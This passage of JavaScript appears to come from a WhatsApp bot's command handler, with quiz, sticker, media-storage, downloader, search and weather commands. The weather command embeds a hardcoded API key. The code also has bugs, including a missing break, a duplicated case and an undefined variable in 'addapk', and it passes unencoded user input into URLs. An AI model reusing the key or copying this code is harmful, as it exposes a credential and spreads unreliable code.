                    timeout
                }
            }
            break
            case 'mathquiz': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) replygcdeepak(`There are still unfinished sessions!`)
                let { genMath, modes } = require('./lib/math')
                if (!text) return replygcdeepak(`Mode: ${Object.keys(modes).join(' | ')}\nUsage example: ${prefix}math medium`)
                let result = await genMath(text.toLowerCase())
                DeepakBotInc.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    replygcdeepak("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                replygcdeepak(`${m.pushName} *Has Gone AFK*${text ? ': ' + text : ''}`)
            }
            break	
            case 'openai-indo': {
	            if (!q) return replygcdeepak(`Example : ${prefix + command} who is ronaldo`)
			      var isiai = await fetchJson(`https://aemt.me/openai?text=${q}`)
			      var isi = isiai.result
		         await replygcdeepak(isi)
			   }
			   break
    case 'xxqc': {
if (!q) return replygcdeepak(`📌Example: ${prefix + command} pink hallo\n\n꒰ 🖌️ Color List ꒱ ೄྀ࿐ ˊˎ-\n━━━━━━⊱⋆⊰━━━━━━\npink\nblue\nred\ngreen\nyellow\npurple\ndarkblue\nlightblue\nash\norange\nblack\nwhite\nteal\nlightpink\nchocolate\nsalmon\nmagenta\ntan\nwheat\ndeeppink\nfire\nskyblue\nsafron\nbrightskyblue\nhotpink\nlightskyblue\nseagreen\ndarkred\norangered\ncyan\nviolet\nmossgreen\ndarkgreen\nnavyblue\ndarkorange\ndarkpurple\nfuchsia\ndarkmagenta\ndarkgray\npeachpuff\nblackishgreen\ndarkishred\ngoldenrod\ndarkishgray\ndarkishpurple\ngold\nsilver`)
if (text.length > 100) return replygcdeepak(`Max 100 character.`)
let [color, ...message] = text.split(' ');
message = message.join(' ');
let backgroundColor;
switch(color) {
case 'pink':
backgroundColor = '#f68ac9';
break;
case 'blue':
backgroundColor = '#6cace4';
break;
case 'red':
backgroundColor = '#f44336';
break;
case 'green':
backgroundColor = '#4caf50';
break;
case 'yellow':
backgroundColor = '#ffeb3b';
break;
case 'purple':
backgroundColor = '#9c27b0';
break;
case 'darkblue':
backgroundColor = '#0d47a1';
break;
case 'lightblue':
backgroundColor = '#03a9f4'; 
break;
case 'ash':
backgroundColor = '#9e9e9e';
break;
case 'orange':
backgroundColor = '#ff9800';
break;
case 'black':
backgroundColor = '#000000';
break;
case 'white':
backgroundColor = '#ffffff';
break;
case 'teal':
backgroundColor = '#008080';
break;
case 'lightpink':
backgroundColor = '#FFC0CB';
break;
case 'chocolate':
backgroundColor = '#A52A2A';
case 'salmon':
backgroundColor = '#FFA07A'; 
break; 
case 'magenta':
backgroundColor = '#FF00FF'; 
break; 
case 'tan':
backgroundColor = '#D2B48C'; 
break;
case 'wheat':
backgroundColor = '#F5DEB3'; 
break;
case 'deeppink':
backgroundColor = '#FF1493'; 
break; 
case 'fire':
backgroundColor = '#B22222';
break;
case 'skyblue':
backgroundColor = '#00BFFF';
break; 
case 'orange':
backgroundColor = '#FF7F50';
break;
case 'brightskyblue':
backgroundColor = '#1E90FF'; 
break; 
case 'hotpink':
backgroundColor = '#FF69B4'; 
break; 
case 'lightskyblue':
backgroundColor = '#87CEEB'; 
break; 
case 'seagreen':
backgroundColor = '#20B2AA'; 
break; 
case 'darkred':
backgroundColor = '#8B0000'; 
break; 
case 'orangered':
backgroundColor = '#FF4500'; 
break; 
case 'cyan':
backgroundColor = '#48D1CC'; 
break; 
case 'violet':
backgroundColor = '#BA55D3'; 
break; 
case 'mossgreen':
backgroundColor = '#00FF7F'; 
break; 
case 'darkgreen':
backgroundColor = '#008000'; 
break; 
case 'navyblue':
backgroundColor = '#191970'; 
break; 
case 'darkorange':
backgroundColor = '#FF8C00'; 
break; 
case 'darkpurple':
backgroundColor = '#9400D3'; 
break; 
case 'fuchsia':
backgroundColor = '#FF00FF'; 
break; 
case 'darkmagenta':
backgroundColor = '#8B008B'; 
break;
case 'darkgray':
backgroundColor = '#2F4F4F'; 
break;
case 'peachpuff':
backgroundColor = '#FFDAB9'; 
break;
case 'darkishgreen':
backgroundColor = '#BDB76B'; 
break;
case 'darkishred':
backgroundColor = '#DC143C'; 
break;
case 'goldenrod':
backgroundColor = '#DAA520'; 
break;
case 'darkishgray':
backgroundColor = '#696969'; 
break;
case 'darkishpurple':
backgroundColor = '#483D8B'; 
break;
case 'gold':
backgroundColor = '#FFD700'; 
break;
case 'silver':
backgroundColor = '#C0C0C0'; 
break;
default:
return replygcdeepak('The selected color is not available.')
}
let obj = {
type: 'quote',
format: 'png',
backgroundColor,
width: 512,
height: 768,
scale: 2,
messages: [
{
entities: [],
avatar: true,
from: {
id: 1,
name: pushname,
photo: { 
url: await DeepakBotInc.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
}
},
text: message,
replyMessage: {},
},
],
};
let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
headers: {
'Content-Type': 'application/json',
},
});
let buffer = Buffer.from(response.data.result.image, 'base64');
DeepakBotInc.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}`})
}
break
    case 'ephemeral': {
                if (!m.isGroup) return DeepakStickGroup()
                if (!isBotAdmins) return DeepakStickBotAdmin()
                if (!isAdmins) return DeepakStickAdmin()
                if (!text) return replygcdeepak('Enter the value on/off')
                if (args[0] === 'on') {
                    await DeepakBotInc.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
                    await replygcdeepak(`Done`)
                } else if (args[0] === 'off') {
                    await DeepakBotInc.sendMessage(m.chat, { disappearingMessagesInChat: false })
                    await replygcdeepak(`Done`)
                }
            }
            break
            case 'delete': case 'del': case 'd':{
            	 let key = {}
 try {
 	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
 	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
 } catch (e) {
 	console.error(e)
 }
 DeepakBotInc.sendMessage(m.chat, { delete: key })
}
break
    case 'autoswview':
    case 'autostatusview':{
             if (!DeepakTheCreator) return DeepakStickOwner()
               if (args.length < 1) return replygcdeepak('on/off?')
               if (args[0] === 'on') {
                  antiswview = true
                  replygcdeepak(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  antiswview = false
                  replygcdeepak(`${command} is disabled`)
               }
            }
            break
    case 'anticall': {
             if (!DeepakTheCreator) return DeepakStickOwner()
               if (args.length < 1) return replygcdeepak('on/off?')
               if (args[0] === 'on') {
                  anticall = true
                  replygcdeepak(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  anticall = false
                  replygcdeepak(`${command} is disabled`)
               }
            }
            break
             break
case 'addvideo':{
if (!DeepakTheCreator) return DeepakStickOwner()
if (args.length < 1) return replygcdeepak('Whats the video name?')
if (VideoDeepak.includes(q)) return replygcdeepak("The name is already in use")
let delb = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
VideoDeepak.push(q)
await fsx.copy(delb, `./DeepakMedia/video/${q}.mp4`)
fs.writeFileSync('./DeepakMedia/database/deepakimage.json', JSON.stringify(VideoDeepak))
fs.unlinkSync(delb)
replygcdeepak(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}
break
case 'delvideo':{
if (!DeepakTheCreator) return DeepakStickOwner()
if (args.length < 1) return replygcdeepak('Enter the video name')
if (!VideoDeepak.includes(q)) return replygcdeepak("The name does not exist in the database")
let wanu = VideoDeepak.indexOf(q)
VideoDeepak.splice(wanu, 1)
fs.writeFileSync('./DeepakMedia/database/deepakimage.json', JSON.stringify(VideoDeepak))
fs.unlinkSync(`./DeepakMedia/video/${q}.mp4`)
replygcdeepak(`Success deleting video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n┋⍟┃\n'
for (let x of VideoDeepak) {
teks += `┋⍟┃⭔ ${x}\n`
}
teks += `┋⍟┃\n└────────────⭓\n\n*Totally there are : ${VideoDeepak.length}*`
replygcdeepak(teks)
}
break
case 'addimage':{
if (!DeepakTheCreator) return DeepakStickOwner()
if (args.length < 1) return replygcdeepak('Whats the image name?')
if (ImageDeepak.includes(q)) return replygcdeepak("The name is already in use")
let delb = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
ImageDeepak.push(q)
await fsx.copy(delb, `./DeepakMedia/image/${q}.jpg`)
fs.writeFileSync('./DeepakMedia/database/deepakimage.json', JSON.stringify(ImageDeepak))
fs.unlinkSync(delb)
replygcdeepak(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'delimage':{
if (!DeepakTheCreator) return DeepakStickOwner()
if (args.length < 1) return replygcdeepak('Enter the image name')
if (!ImageDeepak.includes(q)) return replygcdeepak("The name does not exist in the database")
let wanu = ImageDeepak.indexOf(q)
ImageDeepak.splice(wanu, 1)
fs.writeFileSync('./DeepakMedia/database/deepakimage.json', JSON.stringify(ImageDeepak))
fs.unlinkSync(`./DeepakMedia/image/${q}.jpg`)
replygcdeepak(`Success deleting image ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n┋⍟┃\n'
for (let x of ImageDeepak) {
teks += `┋⍟┃⭔ ${x}\n`
}
teks += `┋⍟┃\n└────────────⭓\n\n*Totally there are : ${ImageDeepak.length}*`
replygcdeepak(teks)
}
break
case 'addsticker':{
if (!DeepakTheCreator) return DeepakStickOwner()
if (args.length < 1) return replygcdeepak('Whats the sticker name?')
if (StickerDeepak.includes(q)) return replygcdeepak("The name is already in use")
let delb = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
StickerDeepak.push(q)
await fsx.copy(delb, `./DeepakMedia/sticker/${q}.webp`)
fs.writeFileSync('./DeepakMedia/database/deepaksticker.json', JSON.stringify(StickerDeepak))
fs.unlinkSync(delb)
replygcdeepak(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!DeepakTheCreator) return DeepakStickOwner()
if (args.length < 1) return replygcdeepak('Enter the sticker name')
if (!StickerDeepak.includes(q)) return replygcdeepak("The name does not exist in the database")
let wanu = StickerDeepak.indexOf(q)
StickerDeepak.splice(wanu, 1)
fs.writeFileSync('./DeepakMedia/database/deepaksticker.json', JSON.stringify(StickerDeepak))
fs.unlinkSync(`./DeepakMedia/sticker/${q}.webp`)
replygcdeepak(`Success deleting sticker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n┋⍟┃\n'
for (let x of StickerDeepak) {
teks += `┋⍟┃⭔ ${x}\n`
}
teks += `┋⍟┃\n└────────────⭓\n\n*Totally there are : ${StickerDeepak.length}*`
replygcdeepak(teks)
}
break
case 'addmsg': {
	if (!DeepakTheCreator) return DeepakStickOwner()
                if (!m.quoted) return replygcdeepak('Reply Message You Want To Save In Database')
                if (!text) return replygcdeepak(`Example : ${prefix + command} filename`)
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) return replygcdeepak(`'${text}' registered in the message list`)
                msgs[text.toLowerCase()] = quoted.fakeObj
replygcdeepak(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) return replygcdeepak(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) return replygcdeepak(`'${text}' not listed in the message list`)
                DeepakBotInc.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        replygcdeepak(teks)
	    }
	    break 
	case 'delmsg': case 'deletemsg': {
		if (!DeepakTheCreator) return DeepakStickOwner()
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return replygcdeepak(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		replygcdeepak(`Successfully deleted '${text}' from the message list`)
            }
	    break
case 'addvn':{
if (!DeepakTheCreator) return DeepakStickOwner()
if (args.length < 1) return replygcdeepak('Whats the audio name?')
if (VoiceNoteDeepak.includes(q)) return replygcdeepak("The name is already in use")
let delb = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
VoiceNoteDeepak.push(q)
await fsx.copy(delb, `./DeepakMedia/audio/${q}.mp3`)
fs.writeFileSync('./DeepakMedia/database/deepakvn.json', JSON.stringify(VoiceNoteDeepak))
fs.unlinkSync(delb)
replygcdeepak(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}
break
case 'delvn':{
if (!DeepakTheCreator) return DeepakStickOwner()
if (args.length < 1) return replygcdeepak('Enter the vn name')
if (!VoiceNoteDeepak.includes(q)) return replygcdeepak("The name does not exist in the database")
let wanu = VoiceNoteDeepak.indexOf(q)
VoiceNoteDeepak.splice(wanu, 1)
fs.writeFileSync('./DeepakMedia/database/deepakvn.json', JSON.stringify(VoiceNoteDeepak))
fs.unlinkSync(`./DeepakMedia/audio/${q}.mp3`)
replygcdeepak(`Success deleting vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n┋⍟┃\n'
for (let x of VoiceNoteDeepak) {
teks += `┋⍟┃⭔ ${x}\n`
}
teks += `┋⍟┃\n└────────────⭓\n\n*Totally there are : ${VoiceNoteDeepak.length}*`
replygcdeepak(teks)
}
break
case 'addzip':{
if (!DeepakTheCreator) return DeepakStickOwner()

if (args.length < 1) return replygcdeepak(`What's the zip name?`)
let teks = `${text}`
{
if (ZipDeepak.includes(teks)) return replygcdeepak("This name is already in use")
let delb = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
ZipDeepak.push(teks)
await fsx.copy(delb, `./DeepakMedia/zip/${teks}.zip`)
fs.writeFileSync('./DeepakMedia/database/zip.json', JSON.stringify(ZipDeepak))
fs.unlinkSync(delb)
replygcdeepak(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!DeepakTheCreator) return DeepakStickOwner()

if (args.length < 1) return replygcdeepak('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipDeepak.includes(teks)) return replygcdeepak("This name does not exist in the database")
let wanu = ZipDeepak.indexOf(teks)
ZipDeepak.splice(wanu, 1)
fs.writeFileSync('./DeepakMedia/database/zip.json', JSON.stringify(ZipDeepak))
fs.unlinkSync(`./DeepakMedia/zip/${teks}.zip`)
replygcdeepak(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {

let teksooooo = '┌──⭓「 *ZIP LIST* 」\n┋⍟┃\n'
for (let x of ZipDeepak) {
teksooooo += `┋⍟┃⭔ ${x}\n`
}
teksooooo += `┋⍟┃\n└────────────⭓\n\n*Total : ${ZipDeepak.length}*`
replygcdeepak(teksooooo)
}
break
case 'addapk':{
if (!DeepakTheCreator) return DeepakStickOwner()

if (args.length < 1) return replygcdeepak('What is the name of the apk?')
let teks = `${text}`
{
if (ApkDeepak.includes(teks)) return replygcdeepak("This name is already in use")
let delb = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./DeepakMedia/apk/${teks}.apk`)
fs.writeFileSync('./DeepakMedia/database/apk.json', JSON.stringify(ApkDeepak))
fs.unlinkSync(delb)
replygcdeepak(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!DeepakTheCreator) return DeepakStickOwner()

if (args.length < 1) return replygcdeepak('Name of the apk?')
let teks = `${text}`
{
if (!ApkDeepak.includes(teks)) return replygcdeepak("This name does not exist in the database")
let wanu = ApkDeepak.indexOf(teks)
ApkDeepak.splice(wanu, 1)
fs.writeFileSync('./DeepakMedia/database/apk.json', JSON.stringify(ApkDeepak))
fs.unlinkSync(`./DeepakMedia/apk/${teks}.apk`)
replygcdeepak(`Successfully deleted Apk ${teks}`)
}
}
break
case 'listapk': {

let teksoooooo = '┌──⭓「 *APK LIST* 」\n┋⍟┃\n'
for (let x of ApkDeepak) {
teksoooooo += `┋⍟┃⭔ ${x}\n`
}
teksoooooo += `┋⍟┃\n└────────────⭓\n\n*Total : ${ApkDeepak.length}`
replygcdeepak(teksoooooo)
}
break
case 'addpdf':{
if (!DeepakTheCreator) return DeepakStickOwner()

if (args.length < 1) return replygcdeepak('What is the name of the pdf')
let teks = `${text}`
{
if (DocDeepak.includes(teks)) return replygcdeepak("This name is already in use")
let delb = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
DocDeepak.push(teks)
await fsx.copy(delb, `./DeepakMedia/doc/${teks}.pdf`)
fs.writeFileSync('./DeepakMedia/database/doc.json', JSON.stringify(DocDeepak))
fs.unlinkSync(delb)
replygcdeepak(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!DeepakTheCreator) return DeepakStickOwner()

if (args.length < 1) return replygcdeepak('Enter the name')
let teks = `${text}`
{
if (!DocDeepak.includes(teks)) return replygcdeepak("This name does not exist in the database")
let wanu = DocDeepak.indexOf(teks)
DocDeepak.splice(wanu, 1)
fs.writeFileSync('./DeepakMedia/database/doc.json', JSON.stringify(DocDeepak))
fs.unlinkSync(`./DeepakMedia/doc/${teks}.pdf`)
replygcdeepak(`Successfully deleted pdf ${teks}`)
}
}
break
case 'listpdf': {

let teksoooo = '┌──⭓「 *PDF LIST* 」\n┋⍟┃\n'
for (let x of DocDeepak) {
teksoooo += `┋⍟┃⭔ ${x}\n`
}
teksoooo += `┋⍟┃\n└────────────⭓\n\n*Total : ${DocDeepak.length}*`
replygcdeepak(teksoooo)
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
DeepakBotInc_dev = await getBuffer(`https://github.com/DGDEEPAK/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await DeepakBotInc.sendMessage(m.chat, { audio: DeepakBotInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'friend':
case 'searchfriend':{
await DeepakStickWait()
let teman = pickRandom(deepakverifieduser)
setTimeout(() => {
}, 1000)
setTimeout(() => {
replygcdeepak('Managed to Get One Person')
}, 5000)
setTimeout(() => {
DeepakBotInc.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
case 'q': case 'quoted': {
if (!m.quoted) return replygcdeepak('Reply the Message!!')
let deepakquotx= await DeepakBotInc.serializeM(await m.getQuotedObj())
if (!deepakquotx.quoted) return replygcdeepak('The message you are replying to is not sent by the bot')
await deepakquotx.quoted.copyNForward(m.chat, true)
}
break
case 'obfus': case 'obfuscate':{
if (!q) return replygcdeepak(`Example ${prefix+command} const deepakbot = require('baileys')`)
let meg = await obfus(q)
replygcdeepak(`Success
${meg.result}`)
}
break
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return replygcdeepak('Enter Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                replygcdeepak(teks)
	    }
	    break
case 'yts': case 'ytsearch': {
                if (!text) return replygcdeepak(`Example : ${prefix + command} story wa anime`)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
                }
                DeepakBotInc.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
            case 'play':  case 'song': {
if (!text) return replygcdeepak(`Example : ${prefix + command} anime whatsapp status`)
const deepakplaymp3 = require('./lib/ytdl')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await deepakplaymp3.mp3(anup3k.url)
await DeepakBotInc.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            sourceUrl: websitex,
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break
case 'ytmp3': case 'ytaudio':
let deepakaudp3 = require('./lib/ytdl')
if (args.length < 1 || !isUrl(text) || !deepakaudp3.isYTUrl(text)) return replygcdeepak(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/neyYDAlIY5w?si=BfsZ0ZlAs1FVhbUK`)
let audio = await deepakaudp3.mp3(text)
await DeepakBotInc.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted:m})
await fs.unlinkSync(audio.path)
break
case 'ytmp4': case 'ytvideo': {
const deepakvidoh = require('./lib/ytdl')
if (args.length < 1 || !isUrl(text) || !deepakvidoh.isYTUrl(text)) replygcdeepak(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
const vid=await deepakvidoh.mp4(text)
const ytc=`
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`
await DeepakBotInc.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'git': case 'gitclone':
if (!args[0]) return replygcdeepak(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DGDEEPAK/DeepakMedia`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcdeepak(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    DeepakBotInc.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcdeepak(mess.error))
break
case'tiktok':{
if (!text) return replygcdeepak(`Use it by the way: ${prefix+command} *query*\n\n_Example_\n\n${prefix+command} khaby lame`)
DeepakBotInc.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let anu = await fetchJson(`https://api.junn4.my.id/search/tiktoksearch?query=${text}`)
const capt = anu.result.title
await DeepakBotInc.sendMessage(m.chat, { video: { url: anu.result.no_watermark}, caption: `🔖TITLE : ${capt}`}, {quoted: m})
await DeepakBotInc.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}catch (error) {
replygcdeepak(`Sorry this video can't be download\n\nRequest failed with status code *400*`);
}
}
break
case 'tiktokvideo':
case 'tiktokmp4': {
if (!q) return replygcdeepak( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replygcdeepak(`Link Invalid!!`)
require('./lib/tiktok').Tiktok(q).then( data => {
DeepakBotInc.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'tiktokmp3':
case 'tiktokaudio':{
if (!q) return replygcdeepak( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replygcdeepak(`Link Invalid!!`)
require('./lib/tiktok').Tiktok(q).then( data => {
const deepaktikmp3 = {url:data.audio}
DeepakBotInc.sendMessage(m.chat, { audio: deepaktikmp3, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
})
}
break
case'ttslide': case 'tiktokslide':{
if (!text) return replygcdeepak(`Use it by the way ${prefix+command} *url*\n\n_Example_\n\n${prefix+command} https://vt.tiktok.com/ZSL36LfEP/`)
DeepakBotInc.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let anu = await fetchJson(`https://aemt.me/download/tiktokslide?url=${text}`)
await DeepakBotInc.sendMessage(m.chat, { image: { url: anu.result.data.origin_cover}, caption: ``}, {quoted: m})
await DeepakBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await DeepakBotInc.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
case 'google': {
if (!q) return replygcdeepak(`Example : ${prefix + command} ${botname}`)
await DeepakStickWait()
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
replygcdeepak(teks)
})
}
break
case 'weather':{
if (!text) return replygcdeepak('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           DeepakBotInc.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
           case 'facebook2': case 'fb2':{
if (!text) return replygcdeepak(`Enter the link!!!`)
if (!isUrl(args[0])) return replygcdeepak(`Where is the link?`)
await DeepakBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
try{
let anu = await fetchJson(`https://aemt.me/download/fbdown?url=${text}`)
